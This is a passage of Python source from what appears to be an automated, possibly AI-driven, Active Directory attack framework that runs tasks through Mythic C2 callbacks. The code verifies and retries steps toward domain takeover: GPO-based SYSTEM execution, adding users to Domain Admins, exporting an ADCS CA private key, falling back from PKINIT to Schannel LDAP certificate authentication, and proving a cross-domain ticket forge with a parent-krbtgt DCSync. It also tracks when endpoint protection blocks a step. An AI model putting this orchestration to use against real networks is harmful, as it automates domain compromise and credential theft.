            "stage": "effect_verification",
            "command": self._capability_text(command_obj.get("command")),
            "expected_probe": self._capability_text(command_obj.get("expected_probe")),
            "final_probe": final_probe,
            "verdict": verdict,
            "reason": self._capability_text(getattr(verification, "reason", "")),
        }
        transaction.setdefault("events", []).append(event)
        if verdict == "achieved" and final_probe:
            transaction["status"] = "effect_achieved"
            transaction["pin_planner"] = False
            transaction.pop("pin_reason", None)
            transaction.pop("blocker", None)
            return
        if final_probe:
            self._capability_transaction_mark_unverified(
                transaction,
                event["reason"] or "final verifier did not prove the required effect",
            )

    def _capability_transaction_record_task_failure(self, transaction: dict, command_obj: dict, issued_item: dict) -> None:
        if not isinstance(transaction, dict):
            return
        reason = self._capability_text(issued_item.get("failure_reason") or "capability command failed")
        transaction.setdefault("events", []).append({
            "stage": "command_failure",
            "command": self._capability_text(command_obj.get("command")),
            "expected_probe": self._capability_text(command_obj.get("expected_probe")),
            "reason": reason,
        })
        transaction["status"] = "command_failed"
        transaction["pin_planner"] = True
        transaction["pin_reason"] = reason
        transaction["blocker"] = {
            "stage": "command_failure",
            "reason": reason,
        }

    def _capability_transaction_mark_unverified(self, transaction: dict, reason: str) -> None:
        if not isinstance(transaction, dict):
            return
        if self._capability_text(transaction.get("status")) == "effect_achieved":
            return
        transaction["status"] = "effect_unverified"
        transaction["pin_planner"] = True
        transaction["pin_reason"] = self._capability_text(reason)
        transaction["blocker"] = {
            "stage": "effect_verification",
            "reason": self._capability_text(reason),
        }

    def _capability_transaction_expects_structured_artifact(self, command_obj: dict) -> bool:
        produces = {
            self._capability_text(item).casefold()
            for item in list(command_obj.get("produces") or [])
        }
        if any(item.startswith("artifact:") and item.endswith("_validated") for item in produces):
            return True
        purpose = self._capability_text(command_obj.get("purpose")).casefold()
        return "structured" in purpose and "artifact" in purpose and (
            "validate" in purpose or "read back" in purpose
        )

    def _capability_transaction_artifact_failure_is_nonblocking(self, transaction: dict) -> bool:
        """Do not let setup-artifact warnings preempt a stronger final effect proof.

        A stale or malformed GPO XML readback is useful evidence, but for a DC-scoped
        Domain Admin group-add the authoritative proof is delayed membership. Wait and
        poll that final verifier before considering alternate write implementations.
        """
        if not isinstance(transaction, dict):
            return False
        capability = self._capability_text(transaction.get("capability")).casefold()
        if capability != "gpo-controlled-system-exec":
            return False
        obligations = {
            self._capability_text(item).casefold()
            for item in list(transaction.get("proof_obligations") or [])
        }
        return "extract_gpo_domain_admin_membership_probe" in obligations

    def _capability_transaction_is_blocked(self, transaction: dict) -> bool:
        status = self._capability_text(transaction.get("status")).casefold() if isinstance(transaction, dict) else ""
        return status in {"artifact_invalid", "artifact_missing"}

    def _capability_transaction_failure_reason(self, transaction: dict, fallback: str) -> str:
        if not isinstance(transaction, dict):
            return self._capability_text(fallback)
        reason = self._capability_text(transaction.get("pin_reason"))
        if reason:
            return reason
        blocker = transaction.get("blocker")
        if isinstance(blocker, dict):
            reason = self._capability_text(blocker.get("reason"))
            if reason:
                return reason
        return self._capability_text(fallback)

    def _capability_executor_should_skip_leading_preflight(
        self,
        is_current_context_preflight: bool,
        *,
        preflight_ran: bool,
        refresh_current_context: bool,
        core_action_issued: bool,
    ) -> bool:
        # Skip a current-context-preflight step ONLY while it is still a redundant LEADING probe: a separate
        # preflight already ran, we are not refreshing context, and no core action has issued yet. Post-forge
        # steps (the current-TGT import, purge, post-import inventory) can match the preflight heuristic but MUST
        # run — gating on core_action_issued keeps them from being dropped. See the loop in execute_capability for
        # why this matters (a dropped current-session import collapses the cross-domain chain).
        return (
            preflight_ran
            and not refresh_current_context
            and not core_action_issued
            and is_current_context_preflight
        )

    def _capability_executor_is_current_context_preflight(self, command_obj: dict) -> bool:
        produces = {
            self._capability_text(item).casefold()
            for item in (command_obj.get("produces") or [])
        }
        consumes = {
            self._capability_text(item).casefold()
            for item in (command_obj.get("consumes") or [])
        }
        purpose = self._capability_text(command_obj.get("purpose")).casefold()
        if "kerberos_context_inventory" in produces:
            return True
        if "current callback context" in purpose or "current kerberos context" in purpose:
            return True
        return (
            "kerberos_context_inventory" in consumes
            and "kerberos_logon_context" not in consumes
            and "kerberos_ticket_imported" not in consumes
        )

    def _capability_executor_is_current_context_service_proof(self, command_obj: dict) -> bool:
        produces = {
            self._capability_text(item).casefold()
            for item in (command_obj.get("produces") or [])
        }
        consumes = {
            self._capability_text(item).casefold()
            for item in (command_obj.get("consumes") or [])
        }
        return "kerberos_service_access_probe" in produces and "kerberos_context_inventory" in consumes

    def _capability_executor_is_final_probe(self, command_obj: dict) -> bool:
        expected_probe = self._capability_text(command_obj.get("expected_probe")).casefold()
        produces = {
            self._capability_text(item).casefold()
            for item in (command_obj.get("produces") or [])
        }
        consumes = {
            self._capability_text(item).casefold()
            for item in (command_obj.get("consumes") or [])
        }
        purpose = self._capability_text(command_obj.get("purpose")).casefold()
        if expected_probe == "extract_gpo_system_exec_probe":
            if any(item.startswith("artifact:") and item.endswith("_validated") for item in produces):
                return False
            return "event:group_policy_refresh" in consumes or "proof" in purpose
        if expected_probe == "extract_directory_rights_probe":
            return self._capability_text(command_obj.get("operation")).casefold() == "ldap-acl-read"
        final_probe_names = {
            "extract_adcs_ca_private_key_probe",
            "extract_adcs_enrolled_certificate_probe",
            "extract_adcs_certificate_auth_probe",
            "extract_endpoint_protection_probe",
            "extract_gpo_domain_admin_membership_probe",
            "extract_local_admin_access_probe",
            "extract_managed_local_admin_secret_probe",
            "extract_remote_execution_probe",
            # Cross-domain forge proves the parent boundary with a parent-krbtgt DCSync, not a service-access
            # probe; this is the achieving step of that plan.
            "extract_dcsync_secret_probe",
        }
        return bool(expected_probe) and (
            expected_probe in final_probe_names
            or "kerberos_service_access_probe" in produces
        )

    def _capability_executor_is_trailing_cleanup_command(self, command_obj: dict) -> bool:
        operation = self._capability_text(command_obj.get("operation")).casefold()
        return operation in {
            "local-admin-logon-session-revert",
        }

    async def _capability_executor_run_trailing_cleanup_commands(
        self,
        command_objects: list[dict],
        command_index: int,
        callback_id: int,
        timeout: int | None,
        *,
        capability_name: str = "",
    ) -> list[dict]:
        issued: list[dict] = []
        for command_obj in list(command_objects[command_index + 1:]):
            if not self._capability_executor_is_trailing_cleanup_command(command_obj):
                break
            item = await self._execute_capability_command(
                command_obj,
                callback_id,
                timeout,
                capability_name=capability_name,
            )
            item["cleanup"] = True
            issued.append(item)
        return issued

    def _capability_executor_allows_repeated_probe(self, command_obj: dict) -> bool:
        if not self._capability_executor_is_final_probe(command_obj):
            return False
        return self._capability_command_consumes_delayed_effect(command_obj)

    def _capability_should_retry_adcs_dpapi(self, action, inputs: dict, verification) -> bool:
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability != "adcs-ca-private-key-export":
            return False
        if not (
            self._capability_input_bool(inputs, "allow_adcs_dpapi_retry")
            or self._capability_input_bool(inputs, "allow_sharpdpapi_retry")
            or self._capability_input_bool(inputs, "adcs_dpapi_fallback")
        ):
            return False
        if self._capability_input_bool(inputs, "adcs_dpapi_retry_attempted"):
            return False
        method = self._capability_text(
            inputs.get("adcs_ca_export_method")
            or inputs.get("ca_export_method")
            or inputs.get("export_method")
        ).casefold()
        if method in {"sharpdpapi", "dpapi", "machine-dpapi", "machine_dpapi"}:
            return False
        verdict = self._capability_text(getattr(verification, "verdict", "")).casefold()
        reason = self._capability_text(getattr(verification, "reason", "")).casefold()
        return verdict == "blocked" and "key not exportable" in reason

    def _capability_executor_final_probe_retry_limit(self, inputs: dict, command_obj: dict | None = None) -> int:
        value = None
        if isinstance(inputs, dict):
            for key in ("final_probe_retries", "proof_retry_attempts", "proof_retries"):
                if key in inputs and inputs.get(key) not in (None, ""):
                    value = inputs.get(key)
                    break
        if value is None:
            default = "8" if self._capability_command_consumes_delayed_effect(command_obj) else "3"
            env_key = (
                "SAGE_CAPABILITY_DELAYED_PROOF_RETRIES"
                if self._capability_command_consumes_delayed_effect(command_obj)
                else "SAGE_CAPABILITY_PROOF_RETRIES"
            )
            value = os.environ.get(env_key, default)
        try:
            count = int(value)
        except (TypeError, ValueError):
            count = 3
        return max(0, min(count, 8))

    def _capability_executor_final_probe_retry_delay(self, inputs: dict, command_obj: dict | None = None) -> float:
        value = None
        if isinstance(inputs, dict):
            for key in ("final_probe_retry_delay_seconds", "proof_retry_delay_seconds", "proof_retry_delay"):
                if key in inputs and inputs.get(key) not in (None, ""):
                    value = inputs.get(key)
                    break
        if value is None:
            delayed = self._capability_command_consumes_delayed_effect(command_obj)
            env_key = (
                "SAGE_CAPABILITY_DELAYED_PROOF_RETRY_DELAY_SECONDS"
                if delayed else
                "SAGE_CAPABILITY_PROOF_RETRY_DELAY_SECONDS"
            )
            value = os.environ.get(env_key, "30" if delayed else "3")
        try:
            delay = float(value)
        except (TypeError, ValueError):
            delay = 3.0
        return max(0.0, min(delay, 30.0))

    def _capability_command_consumes_delayed_effect(self, command_obj: dict | None) -> bool:
        if not isinstance(command_obj, dict):
            return False
        return any(
            self._capability_text(item).casefold().startswith("event:")
            for item in (command_obj.get("consumes") or [])
        )

    def _capability_should_retry_final_probe(
        self,
        command_obj: dict,
        probe: dict,
        verification,
        retry_attempt: int,
        max_retries: int,
    ) -> bool:
        if retry_attempt >= max_retries:
            return False
        if not self._capability_executor_is_final_probe(command_obj):
            return False
        verdict = self._capability_text(getattr(verification, "verdict", "")).casefold()
        if verdict == "achieved":
            return False
        if not isinstance(probe, dict):
            return False
        hard_negative_keys = {
            "access_denied",
            "account_locked",
            "bad_password",
            "execution_failed",
            "logon_failure",
            "network_path_not_found",
            "rpc_unavailable",
            "wmi_unavailable",
        }
        if any(bool(probe.get(key)) for key in hard_negative_keys):
            return False
        produces = {
            self._capability_text(item).casefold()
            for item in (command_obj.get("produces") or [])
        }
        consumes = {
            self._capability_text(item).casefold()
            for item in (command_obj.get("consumes") or [])
        }
        expects_readback = bool(
            "remote_execution_proof" in produces
            or "remote_process_created" in consumes
            or any(item.endswith("_proof") for item in produces)
        )
        if expects_readback and probe.get("proof_not_found"):
            return True
        consumes_delayed_effect = any(item.startswith("event:") for item in consumes)
        if consumes_delayed_effect and verdict in {"partial", "pending", "deferred"}:
            return True
        return False

    async def _capability_executor_try_gpo_artifact_fallback(
        self,
        action,
        inputs: dict,
        callback_id: int,
        timeout: int | None,
        before_effects: set[str],
        all_issued: list[dict],
        materialized_payload: dict | None,
        prior_transaction: dict,
    ) -> str | None:
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability != "gpo-controlled-system-exec":
            return None
        if self._capability_input_bool(inputs, "_gpo_artifact_fallback_attempted"):
            return None
        status = self._capability_text(prior_transaction.get("status")).casefold() if isinstance(prior_transaction, dict) else ""
        if status != "artifact_invalid":
            return None
        method = self._capability_text(
            inputs.get("method")
            or inputs.get("execution_method")
            or inputs.get("delivery_method")
            or getattr(action, "intent", {}).get("method")
            or getattr(action, "intent", {}).get("execution_method")
            or getattr(action, "intent", {}).get("delivery_method")
        ).casefold()
        if method in {"fallback", "gpp-fallback", "gpp-immediate-task", "gpp-immediate-task-fallback", "manual-gpp"}:
            return None

        blocker = self._capability_transaction_failure_reason(
            prior_transaction,
            "primary GPO structured artifact was syntactically invalid",
        )
        fallback_inputs = dict(inputs)
        fallback_inputs["_gpo_artifact_fallback_attempted"] = True
        fallback_inputs["method"] = "gpp-immediate-task-fallback"
        fallback_inputs["primary_failure_observed"] = True
        fallback_inputs["failure_reason"] = blocker
        fallback_inputs["gpo_artifact_blocker"] = blocker
        retry_raw = await self.execute_capability(action, fallback_inputs)
        try:
            retry_payload = json.loads(retry_raw)
        except Exception:
            retry_payload = {
                "ok": False,
                "verdict": "failed",
                "capability": self._capability_text(getattr(action, "name", "")),
                "reason": self._capability_text(retry_raw),
                "issued": [],
                "recorded_effects": [],
            }
        if isinstance(retry_payload, dict):
            retry_issued = retry_payload.get("issued") if isinstance(retry_payload.get("issued"), list) else []
            retry_payload["issued"] = self._capability_executor_public_issued(all_issued) + retry_issued
            retry_payload["gpo_artifact_repair"] = "gpp-immediate-task-fallback"
            retry_payload["gpo_artifact_blocker"] = blocker
            retry_payload["primary_transaction"] = prior_transaction
            if "materialized" not in retry_payload:
                retry_payload["materialized"] = self._capability_executor_materialized_summary(materialized_payload)
            if retry_payload.get("recorded_effects") is None:
                retry_payload["recorded_effects"] = sorted(self._capability_achieved_effects() - before_effects)
            return json.dumps(retry_payload, sort_keys=True)
        return None

    async def _capability_executor_try_schannel_fallback(
        self,
        action,
        inputs: dict,
        callback_id: int,
        timeout: int | None,
        capabilities_mod,
        before_effects: set[str],
        all_issued: list[dict],
        materialized_payload: dict | None,
        prior_transaction: dict,
        output: str,
    ) -> str | None:
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability != "adcs-certificate-auth":
            return None
        if self._capability_input_bool(inputs, "_schannel_fallback_attempted"):
            return None
        if self._capability_text(
            inputs.get("certificate_auth_method")
            or inputs.get("adcs_certificate_auth_method")
            or inputs.get("auth_method")
        ).casefold() in {"schannel", "schannel-ldap", "ldap-schannel", "ldaps", "certificate-ldap"}:
            return None
        if not self._capability_executor_pkinit_fallback_eligible(output):
            return None

        fallback_inputs = dict(inputs)
        fallback_inputs["_schannel_fallback_attempted"] = True
        fallback_inputs["certificate_auth_method"] = "schannel-ldap"
        fallback_inputs["preflight_existing_context"] = False
        domain = (
            self._capability_target_domain(action, fallback_inputs)
            or self._capability_domain(action, fallback_inputs)
            or self._capability_account_domain(action, fallback_inputs)
        )
        explicit_ldap_server = self._capability_text(
            fallback_inputs.get("ldap_server")
            or fallback_inputs.get("ldaps_server")
            or fallback_inputs.get("domain_controller")
            or fallback_inputs.get("dc")
        )
        if not explicit_ldap_server:
            pkinit_dc = self._capability_executor_pkinit_domain_controller(output)
            dc_host = "" if pkinit_dc else await self._resolve_domain_controller_host(domain)
            ldap_server = pkinit_dc or dc_host or domain
            if ldap_server:
                fallback_inputs["ldap_server"] = ldap_server
                fallback_inputs["domain_controller"] = ldap_server
                if pkinit_dc:
                    source = "PKINIT KDC response"
                else:
                    source = "BloodHound Domain Controllers membership" if dc_host else "target domain DNS name"
                fallback_inputs["domain_controller_source"] = f"{source} for {domain}"

        fallback_payload = await self._capability_build_command_payload(action, fallback_inputs)
        if not fallback_payload.get("ok"):
            return self._capability_executor_failure_json({
                "ok": False,
                "verdict": "failed",
                "capability": self._capability_text(getattr(action, "name", "")),
                "reason": fallback_payload.get("reason") or "Schannel LDAP fallback build failed after PKINIT was not supported",
                "missing": fallback_payload.get("missing", []),
                "action": asdict(action) if is_dataclass(action) else {},
                "materialized": self._capability_executor_materialized_summary(materialized_payload),
                "issued": self._capability_executor_public_issued(all_issued),
                "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
                "pkinit_transaction": prior_transaction,
                "fallback": "schannel-ldap",
            }, action, fallback_inputs, callback_id, issued=all_issued, build_payload=fallback_payload)

        fallback_transaction = self._capability_transaction_start(action, fallback_payload)
        accumulated_probe: dict = {}
        for fallback_command in list(fallback_payload.get("commands") or []):
            unresolved = self._capability_executor_unresolved_placeholders(fallback_command)
            if unresolved:
                return self._capability_executor_failure_json({
                    "ok": False,
                    "verdict": "failed",
                    "capability": self._capability_text(getattr(action, "name", "")),
                    "reason": "Schannel LDAP fallback still has unresolved runtime placeholders",
                    "missing": sorted(unresolved),
                    "action": asdict(action) if is_dataclass(action) else {},
                    "materialized": self._capability_executor_materialized_summary(materialized_payload),
                    "issued": self._capability_executor_public_issued(all_issued),
                    "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
                    "pkinit_transaction": prior_transaction,
                    "fallback_transaction": fallback_transaction,
                    "fallback": "schannel-ldap",
                }, action, fallback_inputs, callback_id, issued=all_issued, build_payload=fallback_payload)

            fallback_item = await self._execute_capability_command(
                fallback_command,
                callback_id,
                timeout,
                capability_name=self._capability_text(getattr(action, "name", "")),
            )
            fallback_item["fallback"] = "schannel-ldap"
            fallback_item["fallback_reason"] = "PKINIT returned an explicit certificate-auth compatibility error"
            all_issued.append(fallback_item)
            fallback_output = self._capability_text(fallback_item.get("_output"))
            self._capability_transaction_update_artifact(
                fallback_transaction,
                fallback_command,
                fallback_output,
                capabilities_mod,
            )
            probe, verification = self._capability_executor_verify_output(
                action,
                fallback_inputs,
                callback_id,
                fallback_output,
                fallback_command,
                capabilities_mod,
            )
            if verification is not None:
                if probe:
                    accumulated_probe = self._capability_executor_merge_probe(accumulated_probe, probe)
                    verification = capabilities_mod.verify_capability(
                        self._capability_text(getattr(action, "name", "")),
                        accumulated_probe,
                    )
                    probe = dict(accumulated_probe)
                fallback_item["verify_verdict"] = verification.verdict
                fallback_item["verify_reason"] = verification.reason
                self._capability_transaction_update_verification(
                    fallback_transaction,
                    fallback_command,
                    verification,
                )
                if verification.verdict == "achieved":
                    if not self._capability_action_effects_achieved(action):
                        self.record_capability_result(
                            action,
                            probe or accumulated_probe or {},
                            evidence={
                                "source": "execute_capability",
                                "provenance": "run",
                                "mythic_task_id": fallback_item.get("task_id"),
                                "callback_id": callback_id,
                                "command": fallback_item.get("command"),
                                "fallback": "schannel-ldap",
                            },
                        )
                    after_effects = self._capability_achieved_effects()
                    return json.dumps({
                        "ok": True,
                        "verdict": "achieved",
                        "capability": self._capability_text(getattr(action, "name", "")),
                        "reason": verification.reason,
                        "action": asdict(action) if is_dataclass(action) else {},
                        "materialized": self._capability_executor_materialized_summary(materialized_payload),
                        "issued": self._capability_executor_public_issued(all_issued),
                        "recorded_effects": sorted(after_effects - before_effects),
                        "achieved_effects": sorted(after_effects),
                        "stopped_after": "schannel_ldap_fallback_verified_proof",
                        "pkinit_transaction": prior_transaction,
                        "transaction": fallback_transaction,
                        "fallback": "schannel-ldap",
                    }, sort_keys=True)
            if self._capability_executor_task_failed(fallback_item):
                break

        return self._capability_executor_failure_json({
            "ok": False,
            "verdict": "blocked" if self._capability_transaction_is_blocked(fallback_transaction) else "failed",
            "capability": self._capability_text(getattr(action, "name", "")),
            "reason": self._capability_transaction_failure_reason(
                fallback_transaction,
                "Schannel LDAP fallback did not prove certificate authentication",
            ),
            "action": asdict(action) if is_dataclass(action) else {},
            "materialized": self._capability_executor_materialized_summary(materialized_payload),
            "issued": self._capability_executor_public_issued(all_issued),
            "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
            "pkinit_transaction": prior_transaction,
            "transaction": fallback_transaction,
            "stopped_after": fallback_transaction.get("status") or "schannel_ldap_fallback",
            "fallback": "schannel-ldap",
        }, action, fallback_inputs, callback_id, issued=all_issued, build_payload=fallback_payload,
            record_failed=True, failure_probe=accumulated_probe or {})

    @staticmethod
    def _capability_executor_pkinit_domain_controller(output: str) -> str:
        match = re.search(
            r"Using\s+domain\s+controller:\s*([A-Za-z0-9_.-]+)(?::\d+)?",
            str(output or ""),
            flags=re.IGNORECASE,
        )
        return match.group(1) if match else ""

    def _capability_executor_pkinit_fallback_eligible(self, output: str) -> bool:
        low = self._capability_text(output).casefold()
        return (
            "kdc_err_padata_type_nosupp" in low
            or "padata type nosupp" in low
            or "krb-error (16)" in low
            or "kdc_err_client_not_trusted" in low
            or "krb-error (62)" in low
        )

    def _capability_executor_unresolved_placeholders(self, command_obj: dict) -> set[str]:
        placeholders = self._capability_executor_placeholders(command_obj.get("parameters"))
        allowed = {"kerberos_ticket_base64"}
        return {item for item in placeholders if item not in allowed}

    def _capability_executor_placeholders(self, value) -> set[str]:
        found: set[str] = set()
        if isinstance(value, dict):
            for item in value.values():
                found.update(self._capability_executor_placeholders(item))
            return found
        if isinstance(value, (list, tuple, set)):
            for item in value:
                found.update(self._capability_executor_placeholders(item))
            return found
        text = self._capability_text(value)
        for match in re.findall(r"\{\{\s*([A-Za-z0-9_.:-]+)\s*\}\}", text):
            found.add(match.strip())
        return found

    def _capability_executor_task_failed(self, item: dict) -> bool:
        result_class = self._capability_text(item.get("result_class")).casefold()
        output = self._capability_text(item.get("_output"))
        low = output.casefold()
        if result_class == command_builder.ResultClass.SUCCESS.value:
            return False
        if low.startswith("genuine failure"):
            return True
        if low.startswith("stop ") or low.startswith("stop —"):
            return True
        if "timed out after" in low:
            return True
        if "construction failure" in low:
            return True
        return result_class in {
            command_builder.ResultClass.CONSTRUCTION.value,
            command_builder.ResultClass.GENUINE.value,
            command_builder.ResultClass.TRANSIENT.value,
        }

    def _capability_executor_failure_reason(self, output: str) -> str:
        text = self._capability_text(output)
        if not text:
            return "no task output"
        return self._capability_executor_output_preview(text, limit=600)

    def _capability_executor_timeout(self, inputs: dict) -> int | None:
        value = (
            inputs.get("execution_timeout")
            or inputs.get("task_timeout")
            or inputs.get("command_timeout")
            or inputs.get("timeout")
        )
        try:
            timeout = int(value)
            return timeout if timeout > 0 else None
        except (TypeError, ValueError):
            return None

    def _capability_executor_materialized_summary(self, payload: dict | None) -> dict:
        if not isinstance(payload, dict):
            return {}
        out = {
            "ok": bool(payload.get("ok")),
            "capability": self._capability_text(payload.get("capability")),
        }
        staged = payload.get("staged")
        if isinstance(staged, dict):
            out["staged"] = {
                "remote_path": staged.get("remote_path"),
                "callback_id": staged.get("callback_id"),
                "upload_task_id": staged.get("upload_task_id"),
                "mythic_file_uuid": "<file_uuid>" if staged.get("mythic_file_uuid") else "",
            }
        return out

    def _capability_executor_public_issued(self, issued: list[dict]) -> list[dict]:
        public: list[dict] = []
        for item in issued:
            if not isinstance(item, dict):
                continue
            row = {key: value for key, value in item.items() if not str(key).startswith("_")}
            public.append(row)
        return public

    def _capability_failed_effects(self) -> set[str]:
        effects: set[str] = set()
        for hop in list(getattr(self, "_engagement_hops", []) or []):
            if self._capability_text(getattr(hop, "status", "")).casefold() not in {"failed", "blocked"}:
                continue
            evidence = getattr(hop, "evidence", {})
            if isinstance(evidence, dict) and evidence.get("terminal_failure") is False:
                continue
            for effect in list(getattr(hop, "satisfied_effects", []) or []) or [getattr(hop, "effect", "")]:
                text = self._capability_text(effect)
                if text:
                    effects.add(self._canonical_capability_effect(text))
        return effects

    def _capability_executor_failure_class(
        self,
        payload: dict,
        issued: list[dict] | None,
    ) -> str:
        explicit = self._capability_text(payload.get("failure_class") if isinstance(payload, dict) else "").casefold()
        if explicit in {"construction", "genuine", "transient"}:
            return explicit
        issued_rows = [item for item in list(issued or []) if isinstance(item, dict)]
        last = issued_rows[-1] if issued_rows else {}
        result_class = self._capability_text(last.get("result_class")).casefold()
        if result_class in {"construction", "genuine", "transient"}:
            return result_class
        reason = self._capability_text(payload.get("reason") if isinstance(payload, dict) else "")
        output = self._capability_text(last.get("_output"))
        return self._capability_text(
            command_builder.classify_result(
                self._capability_text(last.get("command")),
                output or reason,
            )
        ).casefold()

    def _capability_executor_failure_is_terminal(
        self,
        payload: dict,
        issued: list[dict] | None,
    ) -> bool:
        return self._capability_executor_failure_class(payload, issued) not in {
            "construction",
            "transient",
        }

    def _capability_executor_record_failed_attempt(
        self,
        payload: dict,
        action,
        inputs: dict | None,
        callback_id: str | int | None,
        issued: list[dict] | None,
        failure_probe: dict | None,
    ) -> list[str]:
        if not isinstance(payload, dict) or payload.get("ok") is True:
            return []
        if not action or not self._capability_text(getattr(action, "name", "")):
            return []
        wanted = {
            self._canonical_capability_effect(effect)
            for effect in list(getattr(action, "effects", []) or [])
            if self._capability_text(effect)
        }
        if not wanted or wanted & self._capability_failed_effects():
            return []
        issued_rows = [item for item in list(issued or []) if isinstance(item, dict)]
        last = issued_rows[-1] if issued_rows else {}
        reason = self._capability_text(payload.get("reason") or "capability verifier failed")
        preview = reason
        if last.get("_output"):
            preview = self._capability_executor_output_preview(last.get("_output"), limit=700)
        failure_class = self._capability_executor_failure_class(payload, issued_rows)
        terminal_failure = self._capability_executor_failure_is_terminal(payload, issued_rows)
        payload["failure_class"] = failure_class
        payload["retryable_failure"] = not terminal_failure
        probe = dict(failure_probe or {}) if isinstance(failure_probe, dict) else {}
        if callback_id is not None and not self._capability_text(
            probe.get("callback_id") or probe.get("callback") or probe.get("callback_display_id")
        ):
            probe["callback_id"] = self._capability_text(callback_id)
        evidence = {
            "source": "execute_capability",
            "provenance": "run",
            "terminal_failure": terminal_failure,
            "failure_class": failure_class,
            "retryable_failure": not terminal_failure,
            "callback_id": self._capability_text(callback_id),
            "mythic_task_id": last.get("task_id"),
            "command": last.get("command"),
            "verify_verdict": self._capability_text(payload.get("verdict") or "failed"),
            "verify_reason": reason,
            "result_preview": preview,
        }
        for key in (
            "defender_blocked",
            "payload_quarantined",
            "endpoint_blocked",
            "endpoint_protection_blocked",
            "target_host",
            "target_domain",
        ):
            value = probe.get(key)
            if value not in (None, "", False):
                evidence[key] = value
        if isinstance(payload.get("transaction"), dict):
            evidence["transaction_status"] = payload["transaction"].get("status")
        if isinstance(inputs, dict):
            evidence["capability_inputs"] = self._capability_executor_safe_parameters(inputs)
        record_action = action
        preferred_effect = self._canonical_capability_effect(payload.get("record_failed_effect"))
        if preferred_effect and preferred_effect in wanted and is_dataclass(action):
            action_effects = list(getattr(action, "effects", []) or [])
            reordered_effects = [
                effect
                for effect in action_effects
                if self._canonical_capability_effect(effect) == preferred_effect
            ] + [
                effect
                for effect in action_effects
                if self._canonical_capability_effect(effect) != preferred_effect
            ]
            try:
                record_action = replace(action, effects=reordered_effects)
            except Exception:
                record_action = action
        verification = self.record_capability_result(
            record_action,
            probe,
            evidence=evidence,
        )
        if self._capability_text(getattr(verification, "verdict", "")) == "achieved":
            return []
        return sorted(wanted)

    def _capability_executor_failure_json(
        self,
        payload: dict,
        action,
        inputs: dict | None,
        callback_id: str | int | None = None,
        *,
        reason: str | None = None,
        issued: list[dict] | None = None,
        build_payload: dict | None = None,
        record_failed: bool = False,
        failure_probe: dict | None = None,
    ) -> str:
        if record_failed:
            recorded_failed = self._capability_executor_record_failed_attempt(
                payload,
                action,
                inputs,
                callback_id,
                issued,
                failure_probe,
            )
            if recorded_failed:
                payload["recorded_failed_effects"] = recorded_failed
        return json.dumps(
            self._capability_attach_trajectory_repair(
                payload,
                action,
                inputs,
                callback_id,
                reason=reason,
                issued=issued,
                build_payload=build_payload,
            ),
            sort_keys=True,
        )

    def _capability_attach_trajectory_repair(
        self,
        payload: dict,
        action,
        inputs: dict | None,
        callback_id: str | int | None = None,
        *,
        reason: str | None = None,
        issued: list[dict] | None = None,
        build_payload: dict | None = None,
    ) -> dict:
        if not isinstance(payload, dict) or payload.get("ok") is True:
            return payload
        try:
            trajectory_runtime = self._trajectory_runtime_mod()
            bridge = trajectory_runtime.TrajectoryRepairBridge.from_env()
            issued_rows = issued
            if issued_rows is None:
                issued_rows = payload.get("issued") if isinstance(payload.get("issued"), list) else []
            payload["trajectory_repair"] = bridge.record_failure(
                action=action,
                inputs=inputs or {},
                callback_id=callback_id,
                reason=reason if reason is not None else payload.get("reason", ""),
                issued=issued_rows,
                verifier_status=self._capability_text(payload.get("verdict") or "failed"),
                source="execute_capability",
                build_payload=build_payload,
                policy_decision=(
                    dict((inputs or {}).get("policy_decision") or {})
                    if isinstance((inputs or {}).get("policy_decision"), dict)
                    else {}
                ),
                transaction_id=self._capability_text(
                    (inputs or {}).get("transaction_id")
                    or (getattr(action, "intent", {}) or {}).get("transaction_id")
                ),
            )
        except Exception as exc:
            payload["trajectory_repair"] = {
                "enabled": False,
                "recorded": False,
                "error": self._capability_text(exc),
            }
        return payload

    def _trajectory_runtime_mod(self):
        try:
            from ..trajectory import runtime as trajectory_runtime
            return trajectory_runtime
        except Exception:
            pass
        try:
            import trajectory.runtime as trajectory_runtime
            return trajectory_runtime
        except Exception:
            import sys
            ai_dir = str(Path(__file__).resolve().parents[1])
            if ai_dir not in sys.path:
                sys.path.insert(0, ai_dir)
            import trajectory.runtime as trajectory_runtime
            return trajectory_runtime

    def _capability_existing_effect_proofs(self, action) -> list[dict]:
        wanted = {
            self._capability_text(item).casefold()
            for item in list(getattr(action, "effects", []) or [])
            if self._capability_text(item)
        }
        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
        domain = self._capability_text(
            intent.get("target_domain")
            or intent.get("effect_domain")
            or intent.get("domain")
        ).casefold()
        related = set(wanted)
        if domain:
            related.update({f"da:{domain}", f"ea:{domain}", f"krbtgt-hash:{domain}"})
        proofs: list[dict] = []
        seen: set[str] = set()
        for hop in list(getattr(self, "_engagement_hops", []) or []):
            if self._capability_text(getattr(hop, "status", "")).casefold() != "achieved":
                continue
            effects = list(getattr(hop, "satisfied_effects", []) or [])
            if not effects:
                effects = [getattr(hop, "effect", "")]
            for effect in effects:
                effect_text = self._capability_text(effect).casefold()
                if not effect_text or effect_text in seen:
                    continue
                if effect_text not in related and not (
                    domain and effect_text.startswith("certificate-auth:") and effect_text.endswith(f"@{domain}")
                ):
                    continue
                row = {
                    "effect": effect_text,
                    "technique": self._capability_text(getattr(hop, "technique", "")),
                    "target": self._capability_text(getattr(hop, "target", "")),
                }
                task_id = self._capability_hop_task_id(hop)
                if task_id:
                    row["task_id"] = task_id
                callback_id = self._capability_hop_callback_id(hop)
                if callback_id:
                    row["callback_id"] = callback_id
                proofs.append(row)
                seen.add(effect_text)
        proofs.sort(key=lambda item: (
            0 if item["effect"] in wanted else 1,
            item["effect"],
        ))
        return proofs

    def _capability_hop_task_id(self, hop) -> str:
        evidence = getattr(hop, "evidence", {}) or {}
        if not isinstance(evidence, dict):
            return ""
        for key in ("mythic_task_id", "task_id", "task", "display_id"):
            value = self._capability_text(evidence.get(key)).strip()
            if value:
                return value
        return ""

    def _capability_hop_callback_id(self, hop) -> str:
        evidence = getattr(hop, "evidence", {}) or {}
        if not isinstance(evidence, dict):
            return ""
        for key in ("callback_id", "callback", "callback_display_id"):
            value = self._capability_text(evidence.get(key)).strip()
            if value:
                return value
        return ""

    def _capability_executor_safe_parameters(self, parameters):
        opaque_secret_keys = {
            "credential",
